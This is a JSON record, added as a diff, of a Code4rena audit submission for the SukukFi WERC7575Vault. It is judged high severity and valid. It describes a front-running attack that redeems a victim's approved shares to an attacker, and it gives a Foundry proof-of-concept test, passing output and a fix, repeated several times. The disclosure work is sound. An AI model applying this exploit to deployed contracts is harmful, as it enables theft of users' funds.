@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "VcuomLx35E9",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "VcuomLx35E9",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_VcuomLx35E9.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "VcuomLx35E9",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Attacker can front-run user withdrawals to steal funds in WERC7575Vault",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "hrmneffdii",
+  "body": "### Vulnerability Details\n\nThe `WERC7575Vault` contract acts as an intermediary for the `WERC7575ShareToken`. A critical vulnerability exists in the `redeem` and `withdraw` functions, where the `owner` parameter is exposed and potentially lacks sufficient control checks against `msg.sender`.\n\n```solidity\n// WERC7575Vault.sol\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n        shares = previewWithdraw(assets);\n        _withdraw(assets, shares, receiver, owner);\n    }\n\nfunction redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```\n\nThis implementation allows an attacker to execute a front-running attack. By monitoring the mempool for a user's pending transaction (or simply exploiting an existing approval), an attacker can call `redeem` or `withdraw` specifying the victim's address as the `owner` and the attacker's address as the `receiver`.\n\n**Scenario:**\n1. The user creates an approval via permit, which is executed by the settlement.\n2. The user submits a redeem request to the vault.\n3. An attacker front-runs the user’s redeem transaction.\n4. The user permanently loses their funds.\n\n### Impact\n\nAn attacker can permanently steal the user's underlying assets during the withdrawal or redemption process. This leads to a direct loss of user funds.",
+  "proof_of_concept": "### Proof of Concept\n\nThe following unit test demonstrates the vulnerability in `test/WERC7575.t.sol`:\n\n```solidity\n// WERC7575.t.sol\n\n    function testWithdrawAndRedeemFrontRunning() public {\n        // Define variables\n        address attacker = makeAddr(\"attacker\");\n        uint256 depositAmount = 1000 * 1e18;\n\n        // 1. Give user1 tokens and let them deposit\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n\n        // 2. User1 requests self-allowance through permit and done by settlement\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n\n        // 3. Attacker creates a front running against User1\n        vm.prank(attacker);\n        uint256 assetsRedeemed = vault.redeem(shares, attacker, user1);\n\n        // 4. User1 no longer can redeem the shares\n        vm.prank(user1);\n        vm.expectRevert(abi.encodeWithSelector(IERC20Errors.ERC20InsufficientAllowance.selector, user1, 0, shares));\n        vault.redeem(shares, user1, user1);\n\n        assertEq(assetsRedeemed, depositAmount);\n        assertEq(shareToken.balanceOf(user1), 0);\n        assertEq(token.balanceOf(attacker), AMOUNT * 10);\n\n        console.log(\"Attacker balance : \", token.balanceOf(attacker));\n        console.log(\"User1 balance : \", token.balanceOf(user1));\n    }\n```\n\n**Test Output:**\n\n```bash\nRan 1 test for test/WERC7575.t.sol:WERC7575Test\n[PASS] testWithdrawAndRedeemFrontRunning() (gas: 208944)\nLogs:\n  Attacker balance :  1000000000000000000000\n  User1 balance :  0\n```\n\n### Recommendation\n\n```diff\n-function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n+function redeem(uint256 shares, address receiver) public nonReentrant whenNotPaused returns (uint256 assets) {\n+       address owner = msg.sender;\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L464"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "224",
+    "api_submission_id": "",
+    "uid": "VcuomLx35E9",
+    "number": "224",
+    "title": "Attacker can front-run user withdrawals to steal funds in WERC7575Vault",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "hrmneffdii",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L464"
+    ],
+    "body": "### Vulnerability Details\n\nThe `WERC7575Vault` contract acts as an intermediary for the `WERC7575ShareToken`. A critical vulnerability exists in the `redeem` and `withdraw` functions, where the `owner` parameter is exposed and potentially lacks sufficient control checks against `msg.sender`.\n\n```solidity\n// WERC7575Vault.sol\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n        shares = previewWithdraw(assets);\n        _withdraw(assets, shares, receiver, owner);\n    }\n\nfunction redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```\n\nThis implementation allows an attacker to execute a front-running attack. By monitoring the mempool for a user's pending transaction (or simply exploiting an existing approval), an attacker can call `redeem` or `withdraw` specifying the victim's address as the `owner` and the attacker's address as the `receiver`.\n\n**Scenario:**\n1. The user creates an approval via permit, which is executed by the settlement.\n2. The user submits a redeem request to the vault.\n3. An attacker front-runs the user’s redeem transaction.\n4. The user permanently loses their funds.\n\n### Impact\n\nAn attacker can permanently steal the user's underlying assets during the withdrawal or redemption process. This leads to a direct loss of user funds.",
+    "proof_of_concept": "### Proof of Concept\n\nThe following unit test demonstrates the vulnerability in `test/WERC7575.t.sol`:\n\n```solidity\n// WERC7575.t.sol\n\n    function testWithdrawAndRedeemFrontRunning() public {\n        // Define variables\n        address attacker = makeAddr(\"attacker\");\n        uint256 depositAmount = 1000 * 1e18;\n\n        // 1. Give user1 tokens and let them deposit\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n\n        // 2. User1 requests self-allowance through permit and done by settlement\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n\n        // 3. Attacker creates a front running against User1\n        vm.prank(attacker);\n        uint256 assetsRedeemed = vault.redeem(shares, attacker, user1);\n\n        // 4. User1 no longer can redeem the shares\n        vm.prank(user1);\n        vm.expectRevert(abi.encodeWithSelector(IERC20Errors.ERC20InsufficientAllowance.selector, user1, 0, shares));\n        vault.redeem(shares, user1, user1);\n\n        assertEq(assetsRedeemed, depositAmount);\n        assertEq(shareToken.balanceOf(user1), 0);\n        assertEq(token.balanceOf(attacker), AMOUNT * 10);\n\n        console.log(\"Attacker balance : \", token.balanceOf(attacker));\n        console.log(\"User1 balance : \", token.balanceOf(user1));\n    }\n```\n\n**Test Output:**\n\n```bash\nRan 1 test for test/WERC7575.t.sol:WERC7575Test\n[PASS] testWithdrawAndRedeemFrontRunning() (gas: 208944)\nLogs:\n  Attacker balance :  1000000000000000000000\n  User1 balance :  0\n```\n\n### Recommendation\n\n```diff\n-function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n+function redeem(uint256 shares, address receiver) public nonReentrant whenNotPaused returns (uint256 assets) {\n+       address owner = msg.sender;\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/224",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-11-30T07:47:10.841Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "gq4h6Dtpz4a",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T10:40:26.727Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "VcuomLx35E9",
+          "findingUid": null
+        },
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Attacker can front-run user withdrawals to steal funds in WERC7575Vault",
+      "uid": "VcuomLx35E9",
+      "updatedAt": "2025-11-30T07:47:10.841Z",
+      "user": {
+        "uid": "KgjxfHGMydB",
+        "handle": "hrmneffdii"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "### Vulnerability Details\n\nThe `WERC7575Vault` contract acts as an intermediary for the `WERC7575ShareToken`. A critical vulnerability exists in the `redeem` and `withdraw` functions, where the `owner` parameter is exposed and potentially lacks sufficient control checks against `msg.sender`.\n\n```solidity\n// WERC7575Vault.sol\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n        shares = previewWithdraw(assets);\n        _withdraw(assets, shares, receiver, owner);\n    }\n\nfunction redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```\n\nThis implementation allows an attacker to execute a front-running attack. By monitoring the mempool for a user's pending transaction (or simply exploiting an existing approval), an attacker can call `redeem` or `withdraw` specifying the victim's address as the `owner` and the attacker's address as the `receiver`.\n\n**Scenario:**\n1. The user creates an approval via permit, which is executed by the settlement.\n2. The user submits a redeem request to the vault.\n3. An attacker front-runs the user’s redeem transaction.\n4. The user permanently loses their funds.\n\n### Impact\n\nAn attacker can permanently steal the user's underlying assets during the withdrawal or redemption process. This leads to a direct loss of user funds.",
+      "proofOfConcept": "### Proof of Concept\n\nThe following unit test demonstrates the vulnerability in `test/WERC7575.t.sol`:\n\n```solidity\n// WERC7575.t.sol\n\n    function testWithdrawAndRedeemFrontRunning() public {\n        // Define variables\n        address attacker = makeAddr(\"attacker\");\n        uint256 depositAmount = 1000 * 1e18;\n\n        // 1. Give user1 tokens and let them deposit\n        vm.startPrank(user1);\n        token.approve(address(vault), depositAmount);\n        uint256 shares = vault.deposit(depositAmount, user1);\n        vm.stopPrank();\n\n        // 2. User1 requests self-allowance through permit and done by settlement\n        uint256 deadline = block.timestamp + 3600;\n        bytes32 structHash =\n            keccak256(abi.encode(keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), user1, user1, shares, shareToken.nonces(user1), deadline));\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPrivateKey, digest);\n\n        shareToken.permit(user1, user1, shares, deadline, v, r, s);\n\n        // 3. Attacker creates a front running against User1\n        vm.prank(attacker);\n        uint256 assetsRedeemed = vault.redeem(shares, attacker, user1);\n\n        // 4. User1 no longer can redeem the shares\n        vm.prank(user1);\n        vm.expectRevert(abi.encodeWithSelector(IERC20Errors.ERC20InsufficientAllowance.selector, user1, 0, shares));\n        vault.redeem(shares, user1, user1);\n\n        assertEq(assetsRedeemed, depositAmount);\n        assertEq(shareToken.balanceOf(user1), 0);\n        assertEq(token.balanceOf(attacker), AMOUNT * 10);\n\n        console.log(\"Attacker balance : \", token.balanceOf(attacker));\n        console.log(\"User1 balance : \", token.balanceOf(user1));\n    }\n```\n\n**Test Output:**\n\n```bash\nRan 1 test for test/WERC7575.t.sol:WERC7575Test\n[PASS] testWithdrawAndRedeemFrontRunning() (gas: 208944)\nLogs:\n  Attacker balance :  1000000000000000000000\n  User1 balance :  0\n```\n\n### Recommendation\n\n```diff\n-function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n+function redeem(uint256 shares, address receiver) public nonReentrant whenNotPaused returns (uint256 assets) {\n+       address owner = msg.sender;\n        assets = previewRedeem(shares);\n        _withdraw(assets, shares, receiver, owner);\n    }\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/d7e734192a571511f47962e7f228ad5ed275e7db/src/WERC7575Vault.sol#L464",
+      "number": 224,
+      "aiExplanation": null,
+      "_index": 224
+    }
+  }
+}
